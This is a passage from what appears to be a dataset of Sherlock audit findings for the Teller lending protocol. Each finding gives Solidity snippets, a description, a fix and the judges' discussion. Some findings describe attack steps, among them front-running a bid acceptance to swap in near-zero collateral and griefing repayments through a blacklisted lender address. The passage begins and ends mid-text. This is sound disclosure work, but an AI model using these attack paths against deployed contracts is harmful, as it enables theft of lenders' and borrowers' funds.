_collateralInfo._amount,\n        _collateralInfo._tokenId\n    );\n}\n```\n\nWhen a duplicate collateral is committed it overwrites the collateralInfo for that token, which is used to determine how much collateral to escrow from the borrower.\n```\nfunction lenderAcceptBid(uint256 _bidId)\n    external\n    override\n    pendingBid(_bidId, ""lenderAcceptBid"")\n    whenNotPaused\n    returns (\n        uint256 amountToProtocol,\n        uint256 amountToMarketplace,\n        uint256 amountToBorrower\n    )\n{\n    // Retrieve bid\n    Bid storage bid = bids[_bidId];\n\n    address sender = _msgSenderForMarket(bid.marketplaceId);\n```\n\nTellerV2#lenderAcceptBid only allows the lender input the bidId of the bid they wish to accept, not allowing them to specify the expected collateral. This allows lenders to be honeypot and front-run causing massive loss of funds:\nMalicious user creates and commits a bid to take a loan of 10e18 ETH against 100,000e6 USDC with 15% APR\nLender sees this and calls TellerV2#lenderAcceptBid\nMalicious user front-runs transaction with commitCollateral call setting USDC to 1\nBid is filled sending malicious user 10e18 ETH and escrowing 1 USDC\nAttacker doesn't repay loan and has stolen 10e18 ETH for the price of 1 USDC"ч"Allow lender to specify collateral info and check that it matches the committed addresses and amounts\nDiscussion\nTrumpero\nethereumdegen\nas trumpero says, this issue has been known and so we put in reversions to prevent this from happening. However we do want to eventually fix this in a better way so that you will be able to use two of the same ERC721 as collateral for one loan at some point. Ex. using two bored apes as collateral for one loan. This is not possible due to our patch for this.\n0xJuancito\nEscalate for 10 USDC\nThe validness and the `High` severity of this issue is proved with a coded POC in https://github.com/sherlock-audit/2023-03-teller-judging/issues/250.\nThe comment addresses the `deposit` action, but the attack is actually performed before that, during `commitCollateral`. Commited collateral can actually be updated, which is the root cause of this issue.\nA malicious borrower submits a bid (collateral is commited but not deposited).\nA victim lender decides to accept the bid and sends the tx to the mempool.\nThe malicious borrower sees the tx in the mempool and frontruns it by updating the commited collateral to a minimum.\nThe accept bid tx from the victim lender succeeds and the borrower collateral is finally deposited (but just a minimum).\nTake note that funds are deposited once via deployAndDeposit, which is called during the lenderAcceptBid function.\nThe impact is High because assets are lent with a minimum collateral provided (of as low as 1 wei). This can be consider stealing users funds.\nA coded proof is provided in https://github.com/sherlock-audit/2023-03-teller-judging/issues/250 , which I also suggest to be used for the final report, as it demonstrates the issue with a POC and provides coded recommendations to mitigate the issue.\nsherlock-admin\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ncducrest\nThe `CollateralManager` will never attempt to deposit duplicate collateral, the code for committing collateral is the following:\n```\n    function _commitCollateral(\n        uint256 _bidId,\n        Collateral memory _collateralInfo\n    ) internal virtual {\n        CollateralInfo storage collateral = _bidCollaterals[_bidId];\n        collateral.collateralAddresses.add(_collateralInfo._collateralAddress);\n        collateral.collateralInfo[\n            _collateralInfo._collateralAddress\n        ] = _collateralInfo;\n        // rest of code\n    }\n```\n\nThe set `collateral.collateralAddresses` will not contain the address of the collateral twice since OZ's `EnumerableSetUpgradeable` does not add an element to a set if it is already present (it's a set, not a list). The previous value for `collateral.collateralInfo[_collateralInfo._collateralAddress]` will be replaced with no additional side-effect.\nHence the check for duplicate collateral in `CollateralEscrowV1` is never triggered:\n```\n    function depositAsset(\n        CollateralType _collateralType,\n        address _collateralAddress,\n        uint256 _amount,\n        uint256 _tokenId\n    ) external payable virtual onlyOwner {\n        require(_amount > 0, ""Deposit amount cannot be zero"");\n        _depositCollateral(\n            _collateralType,\n            _collateralAddress,\n            _amount,\n            _tokenId\n        );\n        Collateral storage collateral = collateralBalances[_collateralAddress];\n\n        //Avoids asset overwriting.  Can get rid of this restriction by restructuring collateral balances storage so it isnt a mapping based on address.\n        require(\n            collateral._amount == 0,  // @audit this check is never triggered\n            ""Unable to deposit multiple collateral asset instances of the same contract address.""\n        );\n\n        collateral._collateralType = _collateralType;\n        collateral._amount = _amount;\n        collateral._tokenId = _tokenId;\n        emit CollateralDeposited(_collateralAddress, _amount);\n    }\n```\n\nSee OZ's docs\nethereumdegen\nYour comment about '@audit this check is never triggered' is disproven by this test which had already been in the repo.\n```\nfunction test_depositAsset_ERC721_double_collateral_overwrite_prevention()\n    public\n{\n    CollateralEscrowV1_Override escrow = CollateralEscrowV1_Override(\n        address(borrower.getEscrow())\n    );\n\n    uint256 tokenIdA = erc721Mock.mint(address(borrower));\n    uint256 tokenIdB = erc721Mock.mint(address(borrower));\n\n    borrower.approveERC721(address(erc721Mock), tokenIdA);\n    borrower.approveERC721(address(erc721Mock), tokenIdB);\n\n    vm.prank(address(borrower));\n    escrow.depositAsset(\n        CollateralType.ERC721,\n        address(erc721Mock),\n        1,\n        tokenIdA\n    );\n\n    uint256 storedBalance = borrower.getBalance(address(erc721Mock));\n\n    assertEq(storedBalance, 1, ""Escrow deposit unsuccessful"");\n\n    vm.expectRevert(\n        ""Unable to deposit multiple collateral asset instances of the same contract address.""\n    );\n    vm.prank(address(borrower));\n    escrow.depositAsset(\n        CollateralType.ERC721,\n        address(erc721Mock),\n        1,\n        tokenIdB\n    );\n}\n```\n\nhrishibhat\nEscalation accepted\nValid high After further review and discussions, this is a valid high issue and the POC in #250 proves the same.\nsherlock-admin\nEscalation accepted\nValid high After further review and discussions, this is a valid high issue and the POC in #250 proves the same.\n```\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n```\n\nIAm0x52\nPR: #101\nIAm0x52\nFix looks good. Commit will revert if collateral is already present"чBid acceptance can be front-run to cause massive losses to lenders\nCode Snippet\nTool used\nManual Review
_repayLoan will fail if lender is blacklistedчhighч```\n    function _repayLoan(// rest of code) internal virtual {\n        // rest of code\n        bid.loanDetails.lendingToken.safeTransferFrom(\n            _msgSenderForMarket(bid.marketplaceId),\n            lender,\n            paymentAmount\n        );\n        // rest of code\n```\nчThe internal function that repays a loan `_repayLoan` attempts to transfer the loan token back to the lender. If the loan token implements a blacklist like the common USDC token, the transfer may be impossible and the repayment will fail.\nThis internal `_repayLoan` function is called during any partial / full repayment and during liquidation.\nThe function to repay the loan to the lender directly transfers the token to the lender:\n```\n    function _repayLoan(// rest of code) internal virtual {\n        // rest of code\n        bid.loanDetails.lendingToken.safeTransferFrom(\n            _msgSenderForMarket(bid.marketplaceId),\n            lender,\n            paymentAmount\n        );\n        // rest of code\n```\n\nAny of these functions will fail if loan lender is blacklisted by the token.\nDuring repayment the loan lender is computed by:\n```\n    function getLoanLender(uint256 _bidId)\n        public\n        view\n        returns (address lender_)\n    {\n        lender_ = bids[_bidId].lender;\n\n        if (lender_ == address(lenderManager)) {\n            return lenderManager.ownerOf(_bidId);\n        }\n    }\n```\n\nIf the lender controls a blacklisted address, they can use the lenderManager to selectively transfer the loan to / from the blacklisted whenever they want.ч"Use a push/pull pattern for transferring tokens. Allow repayment of loan and withdraw the tokens of the user into `TellerV2` (or an escrow) and allow lender to withdraw the repayment from `TellerV2` (or the escrow). This way, the repayment will fail only if `TellerV2` is blacklisted.\nDiscussion\nethereumdegen\nWe feel as though this is technically a valid issue but\nhopefully it is extremely rare and edge-case\nit is so rare that it doesnt justify such a large change to the protocol and reducing UX flow for the entire system (an extra tx to withdraw funds)\nand finally, borrowers just have to be aware of the extra risk posed when using tokens which have 'denylists' in them or freezing capabilities and also should justify the risks of the particular party acting as the lender (if lender is likely to have assets frozen, do not borrow from them, etc.) .\nIAm0x52\nSponsor has acknowledged this risk\nethereumdegen\nOkay so after further review we did make a PR to make an option to pay into an escrow vault. This escrow vault is a new contract, a simple smart contract wallet to hold funds for a lender in the event that their account is not able to receive tokens. This way, borrowers can repay loans regardless.\nPR: https://github.com/teller-protocol/teller-protocol-v2/pull/105\nIAm0x52\nFix looks good. Contract now utilizes an escrow contract that will receive tokens in the event that the lender is unable to receive the repayment directly. This ensures that repayment is always possible.\njacksanford1\nTeller decided to fix this issue, so changing label to ""Will Fix""."ч"Any lender can prevent repayment of a loan and its liquidation. In particular, a lender can wait until a loan is almost completely repaid, transfer the loan to a blacklisted address (even one they do not control) to prevent the loan to be fully repaid / liquidated. The loan will default and borrower will not be able to withdraw their collateral.\nThis result in a guaranteed griefing attack on the collateral of a user.\nIf the lender controls a blacklisted address, they can additionally withdraw the collateral of the user.\nI believe the impact is high since the griefing attack is always possible whenever lent token uses a blacklist, and results in a guaranteed loss of collateral.\nCode Snippet\nThe function to withdraw collateral only works when loan is paid or transfer to lender when loan is defaulted:\n```\n    function withdraw(uint256 _bidId) external {\n        BidState bidState = tellerV2.getBidState(_bidId);\n        if (bidState == BidState.PAID) {\n            _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId));\n        } else if (tellerV2.isLoanDefaulted(_bidId)) {\n            _withdraw(_bidId, tellerV2.getLoanLender(_bidId));\n            emit CollateralClaimed(_bidId);\n        } else {\n            revert(""collateral cannot be withdrawn"");\n        }\n    }\n```\n\nTool used\nManual Review"
lender could be forced to withdraw collateral even if he/she would rather wait for liquidation during defaultчmediumч"```\n     * @notice Withdraws deposited collateral from the created escrow of a bid that has been successfully repaid.\n     * @param _bidId The id of the bid to withdraw collateral for.\n     */\n    function withdraw(uint256 _bidId) external {\n        BidState bidState = tellerV2.getBidState(_bidId);\n        console2.log(""WITHDRAW %d"", uint256(bidState));\n        if (bidState == BidState.PAID) {\n            _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId));\n        } else if (tellerV2.isLoanDefaulted(_bidId)) {  audit\n            _withdraw(_bidId, tellerV2.getLoanLender(_bidId));\n            emit CollateralClaimed(_bidId);\n        } else {\n            revert(""collateral cannot be withdrawn"");\n        }\n    }\n```\n"ч"lender could be forced to withdraw collateral even if he/she would rather wait for liquidation during default\nCollateralManager.withdraw would pass if the loan is defaulted (the borrower does not pay interest in time); in that case, anyone can trigger an withdrawal on behalf of the lender before the liquidation delay period passes.\nwithdraw logic from CollateralManager.\n```\n     * @notice Withdraws deposited collateral from the created escrow of a bid that has been successfully repaid.\n     * @param _bidId The id of the bid to withdraw collateral for.\n     */\n    function withdraw(uint256 _bidId) external {\n        BidState bidState = tellerV2.getBidState(_bidId);\n        console2.log(""WITHDRAW %d"", uint256(bidState));\n        if (bidState == BidState.PAID) {\n            _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId));\n        } else if (tellerV2.isLoanDefaulted(_bidId)) {  audit\n            _withdraw(_bidId, tellerV2.getLoanLender(_bidId));\n            emit CollateralClaimed(_bidId);\n        } else {\n            revert(""collateral cannot be withdrawn"");\n        }\n    }\n```\n"ч"check that the caller is the lender\n```\n    function withdraw(uint256 _bidId) external {\n        BidState bidState = tellerV2.getBidState(_bidId);\n        console2.log(""WITHDRAW %d"", uint256(bidState));\n        if (bidState == BidState.PAID) {\n            _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId));\n        } else if (tellerV2.isLoanDefaulted(_bidId)) {\n+++        uint256 _marketplaceId = bidState.marketplaceId; \n+++        address sender = _msgSenderForMarket(_marketplaceId); \n+++        address lender = tellerV2.getLoanLender(_bidId); \n+++        require(sender == lender, ""sender must be the lender""); \n            _withdraw(_bidId, lender);\n            emit CollateralClaimed(_bidId);\n        } else {\n            revert(""collateral cannot be withdrawn"");\n        }\n    }\n```\n\nDiscussion\nethereumdegen\nThank you for the feedback i will review this with the team.\nctf-sec\nEscalate for 10 USDC. Impact is high, so the severity is not medium but high.\nanyone can force lender to take up collateral during liquidation delay and liquidation could be something that never happen.\nbecause the lack of access control dispute normal liquidation flow, which is clearly a high impact\nhttps://docs.sherlock.xyz/audits/judging/judging\nHigh: This vulnerability would result in a material loss of funds, and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nPermissionlessly dispute the liquidation flow make ""the cost of the attack low"" and generate bad debts, which equal to ""loss of fund"". Clearly this is ""not considered an acceptable risk by a reasonable protocol team""\nThanks\nsherlock-admin\nEscalate for 10 USDC. Impact is high, so the severity is not medium but high.\nanyone can force lender to take up collateral during liquidation delay and liquidation could be something that never happen.\nbecause the lack of access control dispute normal liquidation flow, which is clearly a high impact\nhttps://docs.sherlock.xyz/audits/judging/judging\nHigh: This vulnerability would result in a material loss of funds, and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nPermissionlessly dispute the liquidation flow make ""the cost of the attack low"" and generate bad debts, which equal to ""loss of fund"". Clearly this is ""not considered an acceptable risk by a reasonable protocol team""\nThanks\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nTrumpero\nI believe it is a medium since the lender will receive the collateral, which holds more value than the loan itself usually. If the collateral holds less value than the loan, then no one, except the lender, will be willing to liquidate this loan. The lender only miss out on the opportunity to be repaid the loan as originally expected.\nethereumdegen\nGithub PR: Issue 224 - Access control on collateral withdraw\nhrishibhat\nEscalation rejected\nValid medium As the Lead judge pointed out The impact of this issue is a medium. There is no loss of funds for the protocol, this is about being able to withdraw collateral in case the loan is defaulted during the liquidation delay. A missed out opportunity to be repaid, not a high issue\nsherlock-admin\nEscalation rejected\nValid medium As the Lead judge pointed out The impact of this issue is a medium. There is no loss of funds for the protocol, this is about being able to withdraw collateral in case the loan is defaulted during the liquidation delay. A missed out opportunity to be repaid, not a high issue\n```\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.\n```\n\nIAm0x52\nFix looks good. Collateral can now only be withdrawn by the appropriate party. Borrower if paid in full or lender/owner of loan NFT if defaulted."чanyone can force lender to take up collateral during liquidation delay and liquidation could be something that never happen. This does not match the intention based on the spec which implies that lender has an option: `3) When the loan is fully repaid, the borrower can withdraw the collateral. If the loan becomes defaulted instead, then the lender has a 24 hour grace period to claim the collateral (losing the principal)`\nCode Snippet\nTool used\nManual Review
updateCommitmentBorrowers does not delete all existing usersчmediumч```\nmapping(uint256 => EnumerableSetUpgradeable.AddressSet)\n        internal commitmentBorrowersList;\n        \nfunction updateCommitmentBorrowers(\n        uint256 _commitmentId,\n        address[] calldata _borrowerAddressList\n    ) public commitmentLender(_commitmentId) {\n        delete commitmentBorrowersList[_commitmentId];\n        _addBorrowersToCommitmentAllowlist(_commitmentId, _borrowerAddressList);\n    }\n```\nч"`delete` a complex structure that includes mapping will cause problem. See [ethereum/solidity#11843](https://github.com/ethereum/solidity/pull/11843) for more info.\nThe lender can update the list of borrowers by calling `LenderCommitmentForwarder.updateCommitmentBorrowers`. The list of borrowers is EnumerableSetUpgradeable.AddressSet that is a complex structure containing mapping. Using the `delete` keyword to `delete` this structure will not erase the mapping inside it. Let's look at the code of this function.\n```\nmapping(uint256 => EnumerableSetUpgradeable.AddressSet)\n        internal commitmentBorrowersList;\n        \nfunction updateCommitmentBorrowers(\n        uint256 _commitmentId,\n        address[] calldata _borrowerAddressList\n    ) public commitmentLender(_commitmentId) {\n        delete commitmentBorrowersList[_commitmentId];\n        _addBorrowersToCommitmentAllowlist(_commitmentId, _borrowerAddressList);\n    }\n```\n\nI wrote a similar function to prove the problem.\n```\nusing EnumerableSet for EnumerableSet.AddressSet;\n    mapping(uint256 => EnumerableSet.AddressSet) internal users;\n    \n    function test_deleteEnumerableSet() public {\n        uint256 id = 1;\n        address[] memory newUsers = new address[](2);\n        newUsers[0] = address(0x1);\n        newUsers[1] = address(0x2);\n\n        for (uint256 i = 0; i < newUsers.length; i++) {\n            users[id].add(newUsers[i]);\n        }\n        delete users[id];\n        newUsers[0] = address(0x3);\n        newUsers[1] = address(0x4);\n        for (uint256 i = 0; i < newUsers.length; i++) {\n            users[id].add(newUsers[i]);\n        }\n        bool exist = users[id].contains(address(0x1));\n        if(exist) {\n            emit log_string(""address(0x1) exist"");\n        }\n        exist = users[id].contains(address(0x2));\n        if(exist) {\n            emit log_string(""address(0x2) exist"");\n        }\n    }\n/*\n[PASS] test_deleteEnumerableSet() (gas: 174783)\nLogs:\n  address(0x1) exist\n  address(0x2) exist\n*/\n```\n"ч
Bid submission vulnerable to market parameters changesчmediumч```\n    function _submitBid(// rest of code)\n        // rest of code\n        (bid.terms.paymentCycle, bidPaymentCycleType[bidId]) = marketRegistry\n            .getPaymentCycle(_marketplaceId);\n\n        bid.terms.APR = _APR;\n\n        bidDefaultDuration[bidId] = marketRegistry.getPaymentDefaultDuration(\n            _marketplaceId\n        );\n\n        bidExpirationTime[bidId] = marketRegistry.getBidExpirationTime(\n            _marketplaceId\n        );\n\n        bid.paymentType = marketRegistry.getPaymentType(_marketplaceId);\n        \n        bid.terms.paymentCycleAmount = V2Calculations\n            .calculatePaymentCycleAmount(\n                bid.paymentType,\n                bidPaymentCycleType[bidId],\n                _principal,\n                _duration,\n                bid.terms.paymentCycle,\n                _APR\n            );\n        // rest of code\n```\nчThe details for the audit state:\nMarket owners should NOT be able to race-condition attack borrowers or lenders by changing market settings while bids are being submitted or accepted (while tx are in mempool). Care has been taken to ensure that this is not possible (similar in theory to sandwich attacking but worse as if possible it could cause unexpected and non-consentual interest rate on a loan) and further-auditing of this is welcome.\nHowever, there is little protection in place to protect the submitter of a bid from changes in market parameters.\nIn _submitBid(), certain bid parameters are taken from the marketRegistry:\n```\n    function _submitBid(// rest of code)\n        // rest of code\n        (bid.terms.paymentCycle, bidPaymentCycleType[bidId]) = marketRegistry\n            .getPaymentCycle(_marketplaceId);\n\n        bid.terms.APR = _APR;\n\n        bidDefaultDuration[bidId] = marketRegistry.getPaymentDefaultDuration(\n            _marketplaceId\n        );\n\n        bidExpirationTime[bidId] = marketRegistry.getBidExpirationTime(\n            _marketplaceId\n        );\n\n        bid.paymentType = marketRegistry.getPaymentType(_marketplaceId);\n        \n        bid.terms.paymentCycleAmount = V2Calculations\n            .calculatePaymentCycleAmount(\n                bid.paymentType,\n                bidPaymentCycleType[bidId],\n                _principal,\n                _duration,\n                bid.terms.paymentCycle,\n                _APR\n            );\n        // rest of code\n```\nч
EMI last payment not handled perfectly could lead to borrower losing collateralsчmediumч```\n        } else {\n            // Default to PaymentType.EMI\n            // Max payable amount in a cycle\n            // NOTE: the last cycle could have less than the calculated payment amount\n            uint256 maxCycleOwed = isLastPaymentCycle\n                ? owedPrincipal_ + interest_\n                : _bid.terms.paymentCycleAmount;\n\n            // Calculate accrued amount due since last repayment\n            uint256 owedAmount = (maxCycleOwed * owedTime) /\n                _bid.terms.paymentCycle;\n            duePrincipal_ = Math.min(owedAmount - interest_, owedPrincipal_);\n        }\n```\nчThe ternary logic of `calculateAmountOwed()` could have the last EMI payment under calculated, leading to borrower not paying the owed principal and possibly losing the collaterals if care has not been given to.\nSupposing Bob has a loan duration of 100 days such that the payment cycle is evenly spread out, i.e payment due every 10 days, here is a typical scenario:\nBob has been making his payment due on time to avoid getting marked delinquent. For the last payment due, Bob decides to make it 5 minutes earlier just to make sure he will not miss it.\nHowever, `duePrincipal_` ends up assigned the minimum of `owedAmount - interest_` and `owedPrincipal_`, where the former is chosen since `oweTime` is less than _bid.terms.paymentCycle:\n```\n        } else {\n            // Default to PaymentType.EMI\n            // Max payable amount in a cycle\n            // NOTE: the last cycle could have less than the calculated payment amount\n            uint256 maxCycleOwed = isLastPaymentCycle\n                ? owedPrincipal_ + interest_\n                : _bid.terms.paymentCycleAmount;\n\n            // Calculate accrued amount due since last repayment\n            uint256 owedAmount = (maxCycleOwed * owedTime) /\n                _bid.terms.paymentCycle;\n            duePrincipal_ = Math.min(owedAmount - interest_, owedPrincipal_);\n        }\n```\n\nHence, in `_repayLoan()`, `paymentAmount >= _owedAmount` equals false failing to close the loan to have the collaterals returned to Bob:\n```\n        if (paymentAmount >= _owedAmount) {\n            paymentAmount = _owedAmount;\n            bid.state = BidState.PAID;\n\n            // Remove borrower's active bid\n            _borrowerBidsActive[bid.borrower].remove(_bidId);\n\n            // If loan is is being liquidated and backed by collateral, withdraw and send to borrower\n            if (_shouldWithdrawCollateral) {\n                collateralManager.withdraw(_bidId);\n            }\n\n            emit LoanRepaid(_bidId);\n```\n\nWhile lingering and not paying too much attention to the collateral still in escrow, Bob presumes his loan is now settled.\nNext, Alex the lender has been waiting for this golden opportunity and proceeds to calling `CollateralManager.withdraw()` to claim all collaterals as soon as the loan turns defaulted.чConsider refactoring the affected ternary logic as follows:\n```\n        } else {\n// Add the line below\n            duePrincipal = isLastPaymentCycle\n// Add the line below\n                ? owedPrincipal\n// Add the line below\n               : (_bid.terms.paymentCycleAmount * owedTime) / _bid.terms.paymentCycle;\n\n            // Default to PaymentType.EMI\n            // Max payable amount in a cycle\n            // NOTE: the last cycle could have less than the calculated payment amount\n// Remove the line below\n            uint256 maxCycleOwed = isLastPaymentCycle\n// Remove the line below\n                ? owedPrincipal_ // Add the line below\n interest_\n// Remove the line below\n                : _bid.terms.paymentCycleAmount;\n\n            // Calculate accrued amount due since last repayment\n// Remove the line below\n            uint256 owedAmount = (maxCycleOwed * owedTime) /\n// Remove the line below\n                _bid.terms.paymentCycle;\n// Remove the line below\n            duePrincipal_ = Math.min(owedAmount // Remove the line below\n interest_, owedPrincipal_);\n        }\n```\n\nDiscussion\niamjakethehuman\nsherlock-admin\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nraymondfam\nMost borrowers would form a habit making the recurring payments in time by doing it slightly earlier just like anyone would be making a car, credit card or house payment just to make sure no late payments could tarnish their credit reputation. The protocol logic is intuitive in making adjustments to users forming this good habit. However, the current ternary logic could trap/trick many unsavvy borrowers when handling the last payment. The adept users might notice the event emitted but would run into the same issue again unless function repayLoanFull is used instead of function repayLoan. As a borrower, I would expect the system handle the transaction all clean come the last payment.\nAdditionally, function isLoanDefaulted does not care how much principal and interest has been paid in the past; all it cares is whether or not `(uint32(block.timestamp) - _liquidationDelay - lastRepaidTimestamp(_bidId) > bidDefaultDuration[_bidId])` where `_liquidationDelay == 0` in this case. Depending on the value of `bidDefaultDuration[_bidId]`, the amount of seconds elapsed could transpire quickly. Imagine doing this before sleep, and then getting caught up with a full day of chores and work the next day, and before too long the position is already deemed delinquent without the borrower even aware of it.\nethereumdegen\nYour updated logic does compile, however it makes 5 tests fail. Are you also implying that these 5 tests are incorrect? Or does that mean that there is an issue with your suggested logic? In any case, more deeply investigating.\n[FAIL. Reason: Assertion failed.] test_01_calculateAmountOwed() (gas: 442923) [FAIL. Reason: Assertion failed.] test_02_calculateAmountOwed() (gas: 483615) [FAIL. Reason: Assertion failed.] test_03_calculateAmountOwed() (gas: 336240) [FAIL. Reason: Assertion failed.] test_04_calculateAmountOwed() (gas: 441542) [FAIL. Reason: Assertion failed.] test_05_calculateAmountOwed() (gas: 335700)\nhrishibhat\nEscalation rejected\nValid medium This is a valid issue where it gives an incorrect amount during the last payment cycle. Sponsor comment:\nis most certainly a valid issue, there is a fix . The issue is if a user makes all their payments normally and on time, then in the last payment cycle, their amount owed fluctutes over time however the intent is that in the last payment cycle the amount owed should be 'the entire remaining balance' . Not fluctuating over time. (the time fluctuation is because of code that, for cycles that arent the last payment cycle, amount owed is (current cycle amount + amount unpaid from previous cycles) )\nsherlock-admin\nEscalation rejected\nValid medium This is a valid issue where it gives an incorrect amount during the last payment cycle. Sponsor comment:\nis most certainly a valid issue, there is a fix . The issue is if a user makes all their payments normally and on time, then in the last payment cycle, their amount owed fluctutes over time however the intent is that in the last payment cycle the amount owed should be 'the entire remaining balance' . Not fluctuating over time. (the time fluctuation is because of code that, for cycles that arent the last payment cycle, amount owed is (current cycle amount + amount unpaid from previous cycles) )\n```\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.\n```\n\nethereumdegen\nPR fix: https://github.com/teller-protocol/teller-protocol-v2/pull/99\nIAm0x52\nFix looks good. owedAmount calculation has been slightly modified so that it will won't final payment amount by owedTime which will result in a complete repayment of the principalчBob ended up losing all collaterals for the sake of the minute amount of loan unpaid whereas Alex receives almost all principal plus interests on top of the collaterals.\nCode Snippet\nTool used\nManual Review
setLenderManager may cause some Lenders to lose their assetsчmediumч"```\n    function setLenderManager(address _lenderManager)\n        external\n        reinitializer(8)\n        onlyOwner\n    {\n        _setLenderManager(_lenderManager);\n    }\n\n    function _setLenderManager(address _lenderManager)\n        internal\n        onlyInitializing\n    {\n        require(\n            _lenderManager.isContract(),\n            ""LenderManager must be a contract""\n        );\n        lenderManager = ILenderManager(_lenderManager);\n    }\n```\n"ч"If the contract's lenderManager changes, repaid assets will be sent to the old lenderManager\nsetLenderManager is used to change the lenderManager address of the contract\n```\n    function setLenderManager(address _lenderManager)\n        external\n        reinitializer(8)\n        onlyOwner\n    {\n        _setLenderManager(_lenderManager);\n    }\n\n    function _setLenderManager(address _lenderManager)\n        internal\n        onlyInitializing\n    {\n        require(\n            _lenderManager.isContract(),\n            ""LenderManager must be a contract""\n        );\n        lenderManager = ILenderManager(_lenderManager);\n    }\n```\n\nclaimLoanNFT will change the bid.lender to the current lenderManager\n```\n    function claimLoanNFT(uint256 _bidId)\n        external\n        acceptedLoan(_bidId, ""claimLoanNFT"")\n        whenNotPaused\n    {\n        // Retrieve bid\n        Bid storage bid = bids[_bidId];\n\n        address sender = _msgSenderForMarket(bid.marketplaceId);\n        require(sender == bid.lender, ""only lender can claim NFT"");\n        // mint an NFT with the lender manager\n        lenderManager.registerLoan(_bidId, sender);\n        // set lender address to the lender manager so we know to check the owner of the NFT for the true lender\n        bid.lender = address(lenderManager);\n    }\n```\n\nIn getLoanLender, if the bid.lender is the current lenderManager, the owner of the NFT will be returned as the lender, and the repaid assets will be sent to the lender.\n```\n    function getLoanLender(uint256 _bidId)\n        public\n        view\n        returns (address lender_)\n    {\n        lender_ = bids[_bidId].lender;\n\n        if (lender_ == address(lenderManager)) {\n            return lenderManager.ownerOf(_bidId);\n        }\n    }\n// rest of code\n        address lender = getLoanLender(_bidId);\n\n        // Send payment to the lender\n        bid.loanDetails.lendingToken.safeTransferFrom(\n            _msgSenderForMarket(bid.marketplaceId),\n            lender,\n            paymentAmount\n        );\n```\n\nIf setLenderManager is called to change the lenderManager, in getLoanLender, since the bid.lender is not the current lenderManager, the old lenderManager address will be returned as the lender, and the repaid assets will be sent to the old lenderManager, resulting in the loss of the lender's assets"ч"
A borrower/lender or liquidator will fail to withdraw the collateral assets due to reaching a gas limitчmediumч```\nstruct Collateral {\n    CollateralType _collateralType;\n    uint256 _amount;\n    uint256 _tokenId;\n    address _collateralAddress;\n}\n```\nч"Within the TellerV2#submitBid(), there is no limitation that how many collateral assets a borrower can assign into the `_collateralInfo` array parameter.\nThis lead to some bad scenarios like this due to reaching gas limit:\nA borrower or a lender fail to withdraw the collateral assets when the loan would not be liquidated.\nA liquidator will fail to withdraw the collateral assets when the loan would be liquidated.\n```\nstruct Collateral {\n    CollateralType _collateralType;\n    uint256 _amount;\n    uint256 _tokenId;\n    address _collateralAddress;\n}\n```\n\n```\n    /**\n     * Since collateralInfo is mapped (address assetAddress => Collateral) that means\n     * that only a single tokenId per nft per loan can be collateralized.\n     * Ex. Two bored apes cannot be used as collateral for a single loan.\n     */\n    struct CollateralInfo {\n        EnumerableSetUpgradeable.AddressSet collateralAddresses;\n        mapping(address => Collateral) collateralInfo;\n    }\n```\n\n```\n    // bidIds -> validated collateral info\n    mapping(uint256 => CollateralInfo) internal _bidCollaterals;\n```\n\n```\n    function submitBid(\n        address _lendingToken,\n        uint256 _marketplaceId,\n        uint256 _principal,\n        uint32 _duration,\n        uint16 _APR,\n        string calldata _metadataURI,\n        address _receiver,\n        Collateral[] calldata _collateralInfo /// @audit\n    ) public override whenNotPaused returns (uint256 bidId_) {\n        // rest of code\n        bool validation = collateralManager.commitCollateral(\n            bidId_,\n            _collateralInfo /// @audit \n        );\n        // rest of code\n```\n\n```\n    /**\n     * @notice Checks the validity of a borrower's multiple collateral balances and commits it to a bid.\n     * @param _bidId The id of the associated bid.\n     * @param _collateralInfo Additional information about the collateral assets.\n     * @return validation_ Boolean indicating if the collateral balances were validated.\n     */\n    function commitCollateral(\n        uint256 _bidId,\n        Collateral[] calldata _collateralInfo  /// @audit\n    ) public returns (bool validation_) {\n        address borrower = tellerV2.getLoanBorrower(_bidId);\n        (validation_, ) = checkBalances(borrower, _collateralInfo);\n\n        if (validation_) {\n            for (uint256 i; i < _collateralInfo.length; i++) {    \n                Collateral memory info = _collateralInfo[i];\n                _commitCollateral(_bidId, info);  /// @audit\n            }\n        }\n    }\n```\n\n```\n    /**\n     * @notice Checks the validity of a borrower's collateral balance and commits it to a bid.\n     * @param _bidId The id of the associated bid.\n     * @param _collateralInfo Additional information about the collateral asset.\n     */\n    function _commitCollateral(\n        uint256 _bidId,\n        Collateral memory _collateralInfo\n    ) internal virtual {\n        CollateralInfo storage collateral = _bidCollaterals[_bidId];\n        collateral.collateralAddresses.add(_collateralInfo._collateralAddress);\n        collateral.collateralInfo[\n            _collateralInfo._collateralAddress\n        ] = _collateralInfo;  /// @audit\n        // rest of code\n```\n\n```\n    /**\n     * @notice Withdraws deposited collateral from the created escrow of a bid that has been successfully repaid.\n     * @param _bidId The id of the bid to withdraw collateral for.\n     */\n    function withdraw(uint256 _bidId) external {\n        BidState bidState = tellerV2.getBidState(_bidId);\n        if (bidState == BidState.PAID) {\n            _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId)); /// @audit \n        } else if (tellerV2.isLoanDefaulted(_bidId)) {\n            _withdraw(_bidId, tellerV2.getLoanLender(_bidId));  /// @audit \n           // rest of code\n```\n\n```\n    /**\n     * @notice Sends the deposited collateral to a liquidator of a bid.\n     * @notice Can only be called by the 